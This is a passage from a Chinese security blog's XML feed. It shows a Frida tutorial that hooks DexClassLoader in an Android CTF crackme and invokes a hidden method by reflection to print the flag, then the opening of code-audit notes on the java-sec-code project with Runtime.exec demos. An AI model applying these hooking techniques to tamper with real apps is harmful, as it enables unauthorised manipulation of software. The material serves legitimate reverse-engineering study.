overload, use</span><br><span class="line">.overload(&lt;signature&gt;) to choose from:.overload(&#39;java.lang.String&#39;)</span><br><span class="line">.overload(&#39;java.lang.String&#39;, &#39;boolean&#39;)&quot;....&#125;</span><br></pre></td></tr></table></figure><p>发现frida报错了，从报错信息我们可以发现loadClass()有2个重载方法，我们这里需要通过overload指定我们要HOOK的重载方法才行，如果不知道重载哪一个然后可以先让报错在进行操作</p><p>ClassLoader类中的两个loadClass重载方法</p><p>loadClass(String name)；</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException &#123;</span><br><span class="line">        return loadClass(name, false);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>loadClass(String name, boolean resolve)；</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protected Class&lt;?&gt; loadClass(String name, boolean resolve)</span><br><span class="line">        throws ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">            &#x2F;&#x2F; First, check if the class has already been loaded</span><br><span class="line">            Class&lt;?&gt; c &#x3D; findLoadedClass(name);</span><br><span class="line">            if (c &#x3D;&#x3D; null) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    if (parent !&#x3D; null) &#123;</span><br><span class="line">                        c &#x3D; parent.loadClass(name, false);</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        c &#x3D; findBootstrapClassOrNull(name);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">                    &#x2F;&#x2F; ClassNotFoundException thrown if class not found</span><br><span class="line">                    &#x2F;&#x2F; from the non-null parent class loader</span><br><span class="line">                &#125;</span><br><span class="line"> </span><br><span class="line">                if (c &#x3D;&#x3D; null) &#123;</span><br><span class="line">                    &#x2F;&#x2F; If still not found, then invoke findClass in order</span><br><span class="line">                    &#x2F;&#x2F; to find the class.</span><br><span class="line">                    c &#x3D; findClass(name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            return c;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到真正执行loadClass的方法是<code>loadClass(String name, boolean resolve)；</code>, 那么我们可以hook第一个，然后在其调用第二个重载方法。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  Java.perform(function()&#123;</span><br><span class="line">        var dexclassLoader &#x3D; Java.use(&quot;dalvik.system.DexClassLoader&quot;);</span><br><span class="line">        var hookClass &#x3D; undefined;</span><br><span class="line">        var ClassUse &#x3D; Java.use(&quot;java.lang.Class&quot;);</span><br><span class="line"> </span><br><span class="line">        dexclassLoader.loadClass.overload(&#39;java.lang.String&#39;).implementation &#x3D; function(name)&#123;</span><br><span class="line">           &#x2F;&#x2F;定义一个String变量，指定我们需要的类</span><br><span class="line">            var hookname &#x3D; &quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot;;</span><br><span class="line">            &#x2F;&#x2F;直接调用第二个重载方法，跟原本的逻辑相同。</span><br><span class="line">            var result &#x3D; this.loadClass(name,false);</span><br><span class="line">            &#x2F;&#x2F;如果loadClass的name参数和我们想要hook的类名相同</span><br><span class="line">            if(name &#x3D;&#x3D;&#x3D; hookname)&#123;</span><br><span class="line">                &#x2F;&#x2F;则拿到它的值</span><br><span class="line">                hookClass &#x3D; result;</span><br><span class="line">                &#x2F;&#x2F;打印hookClass变量的值</span><br><span class="line">                console.log(hookClass);</span><br><span class="line">                send(hookClass);</span><br><span class="line">                return result;</span><br><span class="line">            &#125;</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>执行情况：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class cn.chaitin.geektan.crackme.MainActivityPatch</span><br><span class="line">[*] &lt;instance: java.lang.Class&gt;</span><br></pre></td></tr></table></figure><p>可以看到我们已经通过hook loadClass拿到了MainActivityPatch类</p><h2 id="Frida-类型转换（Java-cast）"><a href="#Frida-类型转换（Java-cast）" class="headerlink" title="Frida 类型转换（Java.cast）"></a>Frida 类型转换（Java.cast）</h2><p>这里我们是不能直接通过(.)运算符直接调用方法的，可以看到loadClass()返回类型的是一个泛型，其中？代表任何类型，因为loadClass(）也不知道要加载的类的类型，所以返回类型就采用<code>Class&lt;?&gt;</code>代表所有类型的类，所以最后返回的是一个类型为指向<code>MainActivityPatch</code>的Class对象</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protected Class&lt;?&gt; loadClass(String name, boolean resolve)；</span><br></pre></td></tr></table></figure><p>理论是这样的，但实际上却不是，我们还需要进行类型转换。这里Frida提供的一个方法处理泛型的方法<code>Java.cast</code>。<br>构造代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> Java.perform(function()&#123;</span><br><span class="line">        var hookClass &#x3D; undefined;</span><br><span class="line">        var ClassUse &#x3D; Java.use(&quot;java.lang.Class&quot;);</span><br><span class="line">        var dexclassLoader &#x3D; Java.use(&quot;dalvik.system.DexClassLoader&quot;);</span><br><span class="line">        var constructorclass &#x3D; Java.use(&quot;java.lang.reflect.Constructor&quot;);</span><br><span class="line">        var objectclass&#x3D; Java.use(&quot;java.lang.Object&quot;);</span><br><span class="line">        dexclassLoader.loadClass.overload(&#39;java.lang.String&#39;).implementation &#x3D; function(name)&#123;</span><br><span class="line">            var hookname &#x3D; &quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot;;</span><br><span class="line">            var result &#x3D; this.loadClass(name,false);</span><br><span class="line"> </span><br><span class="line">            if(name &#x3D;&#x3D; hookname)&#123;</span><br><span class="line">                var hookClass &#x3D; result;</span><br><span class="line">                console.log(&quot;------------------------------CAST--------------------------------&quot;)</span><br><span class="line">                &#x2F;&#x2F;类型转换</span><br><span class="line">                var hookClassCast &#x3D; Java.cast(hookClass,ClassUse);</span><br><span class="line">                &#x2F;&#x2F;调用getMethods()获取类下的所有方法</span><br><span class="line">                var methods &#x3D; hookClassCast.getMethods();</span><br><span class="line">                console.log(methods);</span><br><span class="line">                console.log(&quot;-----------------------------NOT CAST-----------------------------&quot;)</span><br><span class="line">                &#x2F;&#x2F;未进行类型转换，看看能否调用getMethods()方法</span><br><span class="line">                var methodtest &#x3D; hookClass.getMethods();</span><br><span class="line">                console.log(methodtest);</span><br><span class="line">                console.log(&quot;---------------------OVER------------------------&quot;)</span><br><span class="line">                return result;</span><br><span class="line"> </span><br><span class="line">            &#125;</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211221120607031.png" alt="image-20211221120607031"></p><p>我们可以看到cast后才能调用getMethods(),没有cast则会报为定义不能调用的错误。</p><h2 id="Frida创建任意类型数组（Java-array）"><a href="#Frida创建任意类型数组（Java-array）" class="headerlink" title="Frida创建任意类型数组（Java.array）"></a>Frida创建任意类型数组（Java.array）</h2><p>现在我们得到了一个类型为<code>MainActivityPatch</code>的Class对象，我们接下来就来看看怎么调用<code>Joseph</code>方法。在这之前，你需要对反射的用法有一定的了解。至于怎么用，就针对实际情况选取你认为最好的办法就行了。<br>当然在我多次踩坑之后，比如：</p><ul><li>在Class的getMethod方法中，怎么用js构造<code>int.class</code>,<code>float.class</code>，以及构造Integer.TYPE数组出现莫名错误。</li><li>怎么利用Frida函数构造任意类型的数组。</li><li>无参构造函数调用newInstance()，跟有参构造函数调用newInstance()的问题。</li><li>….</li></ul><p>我认为还是有必要给大家提供一种<code>比较通用</code>的方法。<br>1.利用getDeclaredConstructor()获取具有指定参数列表构造函数的Constructor。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public Constructor&lt;T&gt; getDeclaredConstructor(Class&lt;?&gt;... parameterTypes)</span><br><span class="line">     throws NoSuchMethodException, SecurityException &#123;</span><br><span class="line">     return getConstructor0(parameterTypes, Member.DECLARED);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>可以看到，参数是一个Class&lt;?&gt;…，也就是说这是一个[Ljava.lang.Object;类型的数组。我们现在要到MainActivity</p><p>Patch构造函数对象，从代码中可以知道参数是Object类型。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public MainActivityPatch(Object obj)&#123;</span><br><span class="line">this.orginClass &#x3D; (MainActivity) obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们如何构造并传入这个数组呢</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\\利用java.array的标准写法</span><br><span class="line">var objectclass&#x3D; Java.use(&quot;java.lang.Object&quot;);</span><br><span class="line">var ConstructorParam &#x3D;Java.array(&#39;Ljava.lang.Object;&#39;,[objectclass.class]);</span><br><span class="line">var a &#x3D; hookClassCast.getDeclaredConstructor(ConstructorParam);</span><br><span class="line"> </span><br><span class="line">\\偷懒写法</span><br><span class="line">var a &#x3D; hookClassCast.getDeclaredConstructor([objectclass.class]);</span><br></pre></td></tr></table></figure><p>Java.array()的用法格式如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.array(&#39;type&#39;,[value1,value2,....]);</span><br></pre></td></tr></table></figure><p>支持什么type，大家可以参看<code>frida-java</code>的<a href="https://github.com/frida/frida-java">源码</a>。在<code>class-factory.js</code>中就可以找到了。基本类型如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. Z -- boolean</span><br><span class="line">2. B -- byte</span><br><span class="line">3. C -- char</span><br><span class="line">4. S -- short</span><br><span class="line">5. I --  int</span><br><span class="line">6. J -- long</span><br><span class="line">7. F -- float</span><br><span class="line">8. D  -- double</span><br><span class="line">9. V -- void</span><br></pre></td></tr></table></figure><p>我们getDeclaredConstructor()得到了构造函数Constructor，我们现在要将它实例化，再来看看MainActivityPatch的构造函数，传递一个object对象，并将它强制转换成MainActivity类型。<br>那我们实例化的参数就是MainActivity对象了。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class MainActivityPatch &#123;</span><br><span class="line">    MainActivity originClass;</span><br><span class="line">    &#x2F;&#x2F;构造函数</span><br><span class="line">    public MainActivityPatch(Object obj) &#123;</span><br><span class="line">        this.originClass &#x3D; (MainActivity) obj;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function()&#123;</span><br><span class="line">        var hookClass &#x3D; undefined;</span><br><span class="line">        var ClassUse &#x3D; Java.use(&quot;java.lang.Class&quot;);</span><br><span class="line">        var objectclass&#x3D; Java.use(&quot;java.lang.Object&quot;);</span><br><span class="line">        var dexclassLoader &#x3D; Java.use(&quot;dalvik.system.DexClassLoader&quot;);</span><br><span class="line">        var orininclass &#x3D; Java.use(&quot;cn.chaitin.geektan.crackme.MainActivity&quot;);</span><br><span class="line">        var Integerclass &#x3D; Java.use(&quot;java.lang.Integer&quot;);</span><br><span class="line">        &#x2F;&#x2F;实例化MainActivity对象</span><br><span class="line">        var mainAc &#x3D; orininclass.$new();</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        dexclassLoader.loadClass.overload(&#39;java.lang.String&#39;).implementation &#x3D; function(name)&#123;</span><br><span class="line">            var hookname &#x3D; &quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot;;</span><br><span class="line">            var result &#x3D; this.loadClass(name,false);</span><br><span class="line"> </span><br><span class="line">            if(name &#x3D;&#x3D; hookname)&#123;</span><br><span class="line">                var hookClass &#x3D; result;</span><br><span class="line">                var hookClassCast &#x3D; Java.cast(hookClass,ClassUse);</span><br><span class="line">                console.log(&quot;-----------------------------BEGIN-------------------------------------&quot;);</span><br><span class="line">                &#x2F;&#x2F;获取构造器</span><br><span class="line">                var ConstructorParam &#x3D;Java.array(&#39;Ljava.lang.Object;&#39;,[objectclass.class]);</span><br><span class="line">                var Constructor &#x3D; hookClassCast.getDeclaredConstructor(ConstructorParam);</span><br><span class="line">                console.log(&quot;Constructor:&quot;+Constructor);</span><br><span class="line">                console.log(&quot;orinin:&quot;+mainAc);</span><br><span class="line">                &#x2F;&#x2F;实例化，newInstance的参数也是Ljava.lang.Object;</span><br><span class="line">                var instance &#x3D; Constructor.newInstance([mainAc]);</span><br><span class="line">                console.log(&quot;patchAc:&quot;+instance);</span><br><span class="line">                send(instance);</span><br><span class="line">console.log(&quot;--------------------------------------------------------------------&quot;);</span><br><span class="line">                return result;</span><br><span class="line"> </span><br><span class="line">            &#125;</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>执行结果：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Constructor:public cn.chaitin.geektan.crackme.MainActivityPatch(java.lang.Object)</span><br><span class="line">orinin:cn.chaitin.geektan.crackme.MainActivity@4a3e446</span><br><span class="line">patchAc:cn.chaitin.geektan.crackme.MainActivityPatch@d79b607</span><br><span class="line">message: &#123;&#39;type&#39;: &#39;send&#39;, &#39;payload&#39;: &#39;&lt;instance: java.lang.Object, $className: cn.chaitin.geektan.crackme.MainActivityPatch&gt;&#39;&#125; data: None</span><br></pre></td></tr></table></figure><p>2.我们得到了实例化的类后，第二步就是利用getDeclaredMethods()，获取本类中的所有方法，包括私有的(private、protected、默认以及public)的方法，并通过数组下标的方式获取我们想要的方法。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public Method[] getDeclaredMethods() throws SecurityException &#123;</span><br><span class="line">       Method[] result &#x3D; getDeclaredMethodsUnchecked(false);</span><br><span class="line">       for (Method m : result) &#123;</span><br><span class="line">           &#x2F;&#x2F; Throw NoClassDefFoundError if types cannot be resolved.</span><br><span class="line">           m.getReturnType();</span><br><span class="line">           m.getParameterTypes();</span><br><span class="line">       &#125;</span><br><span class="line">       return result;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>从getDeclareMethods()，我们知道它返回的是一个Method数组</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var func &#x3D; hookClassCast.getDeclaredMethods();</span><br><span class="line">console.log(func);</span><br><span class="line">&#x2F;&#x2F;直接通过下标获取我们要调用的方法</span><br><span class="line">console.log(func[0]);</span><br></pre></td></tr></table></figure><p>看看一个完整的示例，和上面的一样，仅仅调用了getDeclaredMethods()方法。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function()&#123;</span><br><span class="line">        var hookClass &#x3D; undefined;</span><br><span class="line">        var ClassUse &#x3D; Java.use(&quot;java.lang.Class&quot;);</span><br><span class="line">        var objectclass&#x3D; Java.use(&quot;java.lang.Object&quot;);</span><br><span class="line">        var dexclassLoader &#x3D; Java.use(&quot;dalvik.system.DexClassLoader&quot;);</span><br><span class="line">        var orininclass &#x3D; Java.use(&quot;cn.chaitin.geektan.crackme.MainActivity&quot;);</span><br><span class="line">        var Integerclass &#x3D; Java.use(&quot;java.lang.Integer&quot;);</span><br><span class="line">        &#x2F;&#x2F;实例化MainActivity对象</span><br><span class="line">        var mainAc &#x3D; orininclass.$new();</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        dexclassLoader.loadClass.overload(&#39;java.lang.String&#39;).implementation &#x3D; function(name)&#123;</span><br><span class="line">            var hookname &#x3D; &quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot;;</span><br><span class="line">            var result &#x3D; this.loadClass(name,false);</span><br><span class="line"> </span><br><span class="line">            if(name &#x3D;&#x3D; hookname)&#123;</span><br><span class="line">                var hookClass &#x3D; result;</span><br><span class="line">                var hookClassCast &#x3D; Java.cast(hookClass,ClassUse);</span><br><span class="line">                console.log(&quot;-----------------------------BEGIN-------------------------------------&quot;);</span><br><span class="line">                &#x2F;&#x2F;获取构造器</span><br><span class="line">                var ConstructorParam &#x3D;Java.array(&#39;Ljava.lang.Object;&#39;,[objectclass.class]);</span><br><span class="line">                var Constructor &#x3D; hookClassCast.getDeclaredConstructor(ConstructorParam);</span><br><span class="line">                console.log(&quot;Constructor:&quot;+Constructor);</span><br><span class="line">                console.log(&quot;orinin:&quot;+mainAc);</span><br><span class="line">                &#x2F;&#x2F;实例化，newInstance的参数也是Ljava.lang.Object;</span><br><span class="line">                var instance &#x3D; Constructor.newInstance([mainAc]);</span><br><span class="line">                console.log(&quot;MainActivityPatchInstance:&quot;+instance);</span><br><span class="line">                send(instance);</span><br><span class="line">                console.log(&quot;----------------------------Methods---------------------------------&quot;);</span><br><span class="line">                var func &#x3D; hookClassCast.getDeclaredMethods();</span><br><span class="line">                console.log(func);</span><br><span class="line">                console.log(&quot;--------------------------Need Method---------------------------------&quot;);</span><br><span class="line">                console.log(func[0]);</span><br><span class="line">                var f &#x3D; func[0];</span><br><span class="line">                console.log(&quot;---------------------------- OVER---------------------------------&quot;);</span><br><span class="line">                return result;</span><br><span class="line"> </span><br><span class="line">            &#125;</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>执行结果：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211221163603106.png" alt="image-20211221163603106"></p><p>3.接下来就是调用Method.invoke()去执行对应的方法了，invoke方法的第一个参数是执行这个方法的对象实例，第二个参数是带入的实际值数组，返回值是Object，也既是该方法执行后的返回值。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public native Object invoke(Object obj, Object... args)</span><br><span class="line">           throws IllegalAccessException, IllegalArgumentException, InvocationTargetException;</span><br></pre></td></tr></table></figure><p>那现在就有一个问题，第二个值是一个数据，我们需要带入实际值的数组，那这么来构造数组呢，很简单刚刚我们已经学习了Frida 中Java.array的用法。现在我们就来构造2个实际值的Integer数组。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var Integerclass &#x3D; Java.use(&quot;java.lang.Integer&quot;);</span><br><span class="line">var num1 &#x3D; Integerclass.$new(5);</span><br><span class="line">var num2 &#x3D; Integerclass.$new(6);</span><br><span class="line">var numArr1 &#x3D; Java.array(&#39;Ljava.lang.Object;&#39;,[num1,num2]);</span><br><span class="line">var num3 &#x3D; Integerclass.$new(7);</span><br><span class="line">var num4 &#x3D; Integerclass.$new(8);</span><br><span class="line">var numArr2 &#x3D; Java.array(&#39;Ljava.lang.Object;&#39;,[num3,num4]);</span><br></pre></td></tr></table></figure><p>接下来我们就可以愉快的调用Joseph方法了。</p><h2 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a>最终代码</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function()&#123;</span><br><span class="line">        var hookClass &#x3D; undefined;</span><br><span class="line">        var ClassUse &#x3D; Java.use(&quot;java.lang.Class&quot;);</span><br><span class="line">        var objectclass&#x3D; Java.use(&quot;java.lang.Object&quot;);</span><br><span class="line">        var dexclassLoader &#x3D; Java.use(&quot;dalvik.system.DexClassLoader&quot;);</span><br><span class="line">        var orininclass &#x3D; Java.use(&quot;cn.chaitin.geektan.crackme.MainActivity&quot;);</span><br><span class="line">        var Integerclass &#x3D; Java.use(&quot;java.lang.Integer&quot;);</span><br><span class="line">        var mainAc &#x3D; orininclass.$new();</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        dexclassLoader.loadClass.overload(&#39;java.lang.String&#39;).implementation &#x3D; function(name)&#123;</span><br><span class="line">            var hookname &#x3D; &quot;cn.chaitin.geektan.crackme.MainActivityPatch&quot;;</span><br><span class="line">            var result &#x3D; this.loadClass(name,false);</span><br><span class="line">            if(name &#x3D;&#x3D; hookname)&#123;</span><br><span class="line">                var hookClass &#x3D; result;</span><br><span class="line">                var hookClassCast &#x3D; Java.cast(hookClass,ClassUse);</span><br><span class="line">                console.log(&quot;-----------------------------GET Constructor-------------------------------------&quot;);</span><br><span class="line">                var ConstructorParam &#x3D;Java.array(&#39;Ljava.lang.Object;&#39;,[objectclass.class]);</span><br><span class="line">                var Constructor &#x3D; hookClassCast.getDeclaredConstructor(ConstructorParam);</span><br><span class="line">                console.log(&quot;Constructor:&quot;+Constructor);</span><br><span class="line">                console.log(&quot;orinin:&quot;+mainAc);</span><br><span class="line">                var instance &#x3D; Constructor.newInstance([mainAc]);</span><br><span class="line">                console.log(&quot;patchAc:&quot;+instance);</span><br><span class="line">                send(instance);</span><br><span class="line"> </span><br><span class="line">                console.log(&quot;-----------------------------GET Methods----------------------------&quot;);</span><br><span class="line">                var func &#x3D; hookClassCast.getDeclaredMethods();</span><br><span class="line">                console.log(func);</span><br><span class="line">                console.log(&quot;--------------------------GET Joseph Function---------------------------&quot;);</span><br><span class="line">                console.log(func[0]);</span><br><span class="line">                var f &#x3D; func[0];</span><br><span class="line">                var num1 &#x3D; Integerclass.$new(5);</span><br><span class="line">                var num2 &#x3D; Integerclass.$new(6);</span><br><span class="line">                var numArr1 &#x3D; Java.array(&#39;Ljava.lang.Object;&#39;,[num1,num2]);</span><br><span class="line">                var num3 &#x3D; Integerclass.$new(7);</span><br><span class="line">                var num4 &#x3D; Integerclass.$new(8);</span><br><span class="line">                var numArr2 &#x3D; Java.array(&#39;Ljava.lang.Object;&#39;,[num3,num4]);</span><br><span class="line">                console.log(&quot;-----------------------------GET Array------------------------------&quot;);</span><br><span class="line">                console.log(numArr1);</span><br><span class="line">                console.log(numArr2);</span><br><span class="line">                var rtn1 &#x3D; f.invoke(instance,numArr1);</span><br><span class="line">                var rtn2 &#x3D; f.invoke(instance,numArr2);</span><br><span class="line">                console.log(&quot;--------------------------------FLAG---------------------------------&quot;);</span><br><span class="line">                console.log(&quot;DDCTF&#123;&quot;+rtn1+rtn2+&quot;&#125;&quot;);</span><br><span class="line">                console.log(&quot;--------------------------------OVER--------------------------------&quot;);</span><br><span class="line">                return result;</span><br><span class="line"> </span><br><span class="line">            &#125;</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>得到最终答案：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211221182844509.png" alt="image-20211221182844509"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://bbs.pediy.com/thread-229657.htm">https://bbs.pediy.com/thread-229657.htm</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;​    上篇主要是跟着师傅学习了Robust的原理，并以做题的思路去求解了这个示例ctf，其实这是一种思路的启示，当我们在不知道怎么hook动态加载的dex，jar时候，找找是否存在能够操作动态加载出来的类的方法。&lt;/p&gt;
&lt;p&gt;​    这一篇我们一起来学习如何用Frida来hook DexclassLoader，如何用反射直接调用类的方法，达到跟hook一般类一样的效果。最终在虚拟机、测试机和frida中发现多种问题，之后更换测试机进行测试的时候仍然存在问题，留下了一部分搞不懂的地方，当个坑未，来找到解决问题在进行填补。&lt;/p&gt;
&lt;h1 id=&quot;文章涉及内容以及使用到的工具&quot;&gt;&lt;a href=&quot;#文章涉及内容以及使用到的工具&quot; class=&quot;headerlink&quot; title=&quot;文章涉及内容以及使用到的工具&quot;&gt;&lt;/a&gt;&lt;strong&gt;文章涉及内容以及使用到的工具&lt;/strong&gt;&lt;/h1&gt;&lt;h2 id=&quot;使用到的工具&quot;&gt;&lt;a href=&quot;#使用到的工具&quot; class=&quot;headerlink&quot; title=&quot;使用到的工具&quot;&gt;&lt;/a&gt;使用到的工具&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;ADT（Android Developer Tools）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Jadx-gui&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;JEB&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;frida&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;apktool&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;android源码包&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Nexus 6p（genymotion，实体机等亦可）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;涉及知识点&quot;&gt;&lt;a href=&quot;#涉及知识点&quot; class=&quot;headerlink&quot; title=&quot;涉及知识点&quot;&gt;&lt;/a&gt;涉及知识点&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Java 泛型&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Java 反射机制&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;DexClassLoader 动态加载机制&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Frida 基本操作&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Frida 创建任意类型数组（Java.array）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Frida 类型转换（Java.cast）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Frida 方法重载（overload）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Frida Spawn&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Android" scheme="http://www.ol4three.com/categories/Android/"/>
    
    
      <category term="Frida" scheme="http://www.ol4three.com/tags/Frida/"/>
    
      <category term="Hook" scheme="http://www.ol4three.com/tags/Hook/"/>
    
  </entry>
  
  <entry>
    <title>Java-sec-code学习记录</title>
    <link href="http://www.ol4three.com/2021/08/12/WEB/Code_audit/Java-sec-code%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>http://www.ol4three.com/2021/08/12/WEB/Code_audit/Java-sec-code%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</id>
    <published>2021-08-12T10:25:42.000Z</published>
    <updated>2022-07-14T10:58:52.607Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>​    最近在搞Java类的代码审计，看到这个项目记录一下自己的学习过程</p><h1 id="0x01环境配置"><a href="#0x01环境配置" class="headerlink" title="0x01环境配置"></a>0x01环境配置</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mac os 11.2.2</span><br><span class="line">tomcat 8.5</span><br><span class="line">idea</span><br><span class="line">msyql 8.0.70</span><br></pre></td></tr></table></figure><p>导入idea项目配置本地tomcat</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;JoyChou93&#x2F;java-sec-code</span><br><span class="line">cd java-sec-code</span><br><span class="line">mvn clean package</span><br></pre></td></tr></table></figure><a id="more"></a><p>打开浏览器访问127.0.0.1:8080</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210827091208429.png" alt="image-20210827091208429"></p><p>输入密码admin/admin123进行登陆</p><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><h2 id="1-Rce"><a href="#1-Rce" class="headerlink" title="1. Rce"></a>1. Rce</h2><h3 id="Java命令执行的几种方式"><a href="#Java命令执行的几种方式" class="headerlink" title="Java命令执行的几种方式"></a>Java命令执行的几种方式</h3><h3 id="1）Runtime-类执行系统命令"><a href="#1）Runtime-类执行系统命令" class="headerlink" title="1）Runtime 类执行系统命令"></a>1）Runtime 类执行系统命令</h3><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Process p &#x3D; Runtime.getRuntime().exec(&quot;calc&quot;);</span><br></pre></td></tr></table></figure><p>详细代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">public class Runtime1 &#123;</span><br><span class="line"></span><br><span class="line">       public static void main(String[] args) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Process p &#x3D; Runtime.getRuntime().exec(&quot;whoami&quot;);</span><br><span class="line">                InputStream input &#x3D; p.getInputStream();</span><br><span class="line">                InputStreamReader ins &#x3D; new InputStreamReader(input, &quot;utf-8&quot;);</span><br><span class="line">                &#x2F;&#x2F;InputStreamReader 字节流到字符流，并指定编码格式</span><br><span class="line">                BufferedReader br &#x3D; new BufferedReader(ins);</span><br><span class="line">                &#x2F;&#x2F;BufferedReader 从字符流读取文件并缓存字符</span><br><span class="line">                String line;</span><br><span class="line">                line &#x3D; br.readLine();</span><br><span class="line">                System.out.println(line);</span><br><span class="line">                br.close();</span><br><span class="line">                ins.close();</span><br><span class="line">                input.close();          </span><br><span class="line">                </span><br><span class="line">            &#125; catch (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过Runtime类exec方法执行命令获取输入流getInputStream()，再InputStreamReader过渡到字符流，并指定gbk的编码格式。BufferedReader 再从字符输入流中读取文本并缓冲字符。再通过readLine()方法打印出结果。</p><p>访问<a 